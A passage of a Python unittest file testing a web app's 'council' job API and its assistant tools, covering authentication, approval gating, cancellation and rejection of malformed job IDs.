        self.assertEqual(self.client.get("/api/council/jobs/" + "f" * 12).status_code, 404)
        self.assertEqual(self.client.get("/api/council/jobs/not-an-id").status_code, 404)
        self.assertEqual(self.client.get("/api/council/jobs/" + "f" * 12 + "/review-packet").status_code, 404)

    def test_models_routes(self):
        self.login()
        rows = self.client.get("/api/council/models").json()["models"]
        self.assertEqual([r["name"] for r in rows], ["qwen", "gemini-flash", "claude"])
        r = self.client.post("/api/council/models/qwen", json={"enabled": False})
        self.assertEqual(r.status_code, 200, r.text)
        self.assertFalse(next(m for m in r.json()["models"] if m["name"] == "qwen")["enabled"])
        self.assertEqual(self.client.post("/api/council/models/nope", json={"enabled": True}).status_code, 404)
        self.assertEqual(self.client.post("/api/council/models/qwen", json={"enabled": "yes"}).status_code, 400)
        self.assertEqual(self.client.post("/api/council/models/bad%20name", json={"enabled": True}).status_code, 400)
        self.assertEqual(self.client.post("/api/council/models/claude", json={"enabled": True}).status_code, 409)
        self.assertEqual(self.client.post("/api/council/models/qwen", json={"enabled": True},
                                          headers={"X-Hub": ""}).status_code, 403)
        self.client.cookies.clear()
        self.assertEqual(self.client.get("/api/council/models").status_code, 401)
        self.assertEqual(self.client.post("/api/council/models/qwen", json={"enabled": True}).status_code, 401)

    def test_models_off_when_council_dir_is_empty(self):
        self.login()
        self.config.council_dir = ""
        self.assertEqual(self.client.get("/api/council/models").status_code, 409)
        self.assertEqual(self.client.post("/api/council/models/qwen", json={"enabled": True}).status_code, 409)

    def test_feature_is_off_when_council_dir_is_empty(self):
        self.login()
        self.config.council_dir = ""
        st = self.client.get("/api/council/status").json()
        self.assertFalse(st["enabled"])
        self.assertEqual(st["setup_command"], "python -m hub setup --only council")
        for method, path in (("POST", "/api/council/run"), ("GET", "/api/council/jobs"),
                             ("GET", f"/api/council/jobs/{'a' * 12}"), ("POST", f"/api/council/jobs/{'a' * 12}/cancel")):
            r = self.client.request(method, path, json={"task": "x"} if method == "POST" else None)
            self.assertEqual(r.status_code, 409, path)
            self.assertIn("not set up", r.json()["detail"])
        self.assertEqual(self.runner.spawned, [])


# ---------------------------------------------------------------------------------------- assistant tools

class Tools(AssistantBase):
    def setUp(self):
        super().setUp()
        self.tmp = Path(tempfile.mkdtemp(prefix="council-tools-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        lab = self.tmp / "lab-checkout"
        (lab / "lab").mkdir(parents=True)
        self.config.data_dir = str(self.tmp / "data")
        self.config.council_dir = str(lab)
        self.runner = FakeRunner()
        patcher = mock.patch.object(council, "Runner", lambda: self.runner)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.app = create_app(self.config, Deps(llm=FakeLLM(), transcriber=FakeTranscriber(),
                                                assistant=FakeAssistant()), audit_path=self.root / "audit.log")
        self.tools = council_tools.build(lambda: self.app, self.config)
        self.mgr = list(council.MANAGERS.values())[-1]      # the manager the app just built

    def by_name(self, name):
        return next(t for t in self.tools if t.spec["name"] == name)

    def call(self, name, **args):
        return reply(tool_block("c1", name, args))

    async def settle(self):
        for _ in range(30):
            await asyncio.sleep(0)

    def test_approvals(self):
        names = {t.spec["name"]: t for t in self.tools}
        self.assertEqual(set(names), {"council_run", "council_status", "council_cancel"})
        self.assertTrue(names["council_run"].needs_approval({}))
        self.assertTrue(names["council_cancel"].needs_approval({}))
        self.assertFalse(names["council_status"].needs_approval({}))
        self.assertIn("notes", names["council_run"].spec["input_schema"]["properties"])
        self.assertIn("resume_job_id", names["council_run"].spec["input_schema"]["properties"])

    async def test_declined_run_starts_nothing_and_approved_run_starts_in_background(self):
        svc = self.service([self.call("council_run", task="compare sorting algorithms"), reply("ok")],
                           extra_tools=self.tools)
        shown = []
        events = await collect(svc.run("s", "go", "claude", False), on_approval=lambda e: (
            shown.append(e), svc.resolve("s", e["id"], False)))
        self.assertTrue(of(events, "tool_result")[0]["denied"])
        self.assertEqual(self.runner.spawned, [])
        self.assertEqual(shown[0]["name"], "council_run")
        self.assertEqual(shown[0]["input"]["task"], "compare sorting algorithms")     # the card shows the exact task

        svc = self.service([self.call("council_run", task="compare sorting algorithms", verify_command="pytest"),
                            reply("started")], extra_tools=self.tools)
        events = await collect(svc.run("s2", "go", "claude", False),
                               on_approval=lambda e: svc.resolve("s2", e["id"], True))
        out = of(events, "tool_result")[0]["output"]
        self.assertIn("Started council run", out)
        await self.settle()
        self.assertEqual(len(self.runner.spawned), 1)
        self.assertIn("--verify=pytest", self.runner.spawned[0][0])

    async def test_status_is_free_and_shows_progress_then_result(self):
        ok, text = await self.by_name("council_status").run({})
        self.assertEqual(text, "No council runs yet.")
        ok, text = await self.by_name("council_run").run({"task": "t"})
        self.assertTrue(ok, text)
        job_id = text.split("run ")[1].split()[0]
        await self.settle()
        self.runner.procs[0].stderr.feed_data(b"round 2 of 5\n")
        await self.settle()
        ok, text = await self.by_name("council_status").run({"job_id": job_id})
        self.assertIn("running", text)
        self.assertIn("round 2 of 5", text)
        self.runner.procs[0].finish(0, json.dumps(RESULT))
        await asyncio.wait_for(self.mgr.tasks[job_id], 10)
        ok, text = await self.by_name("council_status").run({})
        self.assertIn("accepted", text)
        self.assertIn("Use a heap.", text)
        self.assertIn("qwen3:4b: 5", text)

    async def test_preview_refuses_when_off_or_busy_without_asking(self):
        ok, info = await self.by_name("council_run").preview({"task": "t"})
        self.assertTrue(ok, info)
        await self.by_name("council_run").run({"task": "t"})
        ok, info = await self.by_name("council_run").preview({"task": "t2"})
        self.assertFalse(ok)
        self.assertIn("already going", info)
        self.config.council_dir = ""
        ok, info = await self.by_name("council_run").preview({"task": "t"})
        self.assertFalse(ok)
        self.assertIn("not set up", info)

    async def test_claude_escalation_is_refused_by_default(self):
        ok, text = await self.by_name("council_run").run({"task": "t", "escalate_claude": True})
        self.assertFalse(ok)
        self.assertIn("council_allow_claude", text)
        self.assertEqual(self.runner.spawned, [])

    async def test_cancel_and_bad_ids(self):
        ok, text = await self.by_name("council_run").run({"task": "t"})
        job_id = text.split("run ")[1].split()[0]
        await self.settle()
        for bad in ("../x", "x", None, 7):
            ok, msg = await self.by_name("council_cancel").run({"job_id": bad})
            self.assertFalse(ok)
            ok, msg = await self.by_name("council_status").run({"job_id": bad}) if bad else (False, "")
            self.assertFalse(ok)
        ok, info = await self.by_name("council_cancel").preview({"job_id": job_id})
        self.assertTrue(ok, info)
        ok, msg = await self.by_name("council_cancel").run({"job_id": job_id})
        self.assertTrue(ok, msg)
        self.assertTrue(self.runner.procs[0].killed)

    async def test_rerun_with_notes_through_the_tool(self):
        ok, text = await self.by_name("council_run").run({"task": "t"})
        job_id = text.split("run ")[1].split()[0]
        await self.settle()
        run_dir = self.tmp / "rd"
        run_dir.mkdir()
        self.runner.procs[0].finish(0, json.dumps({**RESULT, "run_dir": str(run_dir)}))
        await asyncio.wait_for(self.mgr.tasks[job_id], 10)
        ok, text = await self.by_name("council_run").run({"resume_job_id": job_id, "notes": "fix the edge case"})
        self.assertTrue(ok, text)
        await self.settle()
        self.assertEqual(self.runner.spawned[1][3], "fix the edge case")
        ok, text = await self.by_name("council_run").run({"resume_job_id": "../bad", "notes": "x"})
        self.assertFalse(ok)
        self.assertIn("not valid", text)


if __name__ == "__main__":
    unittest.main()
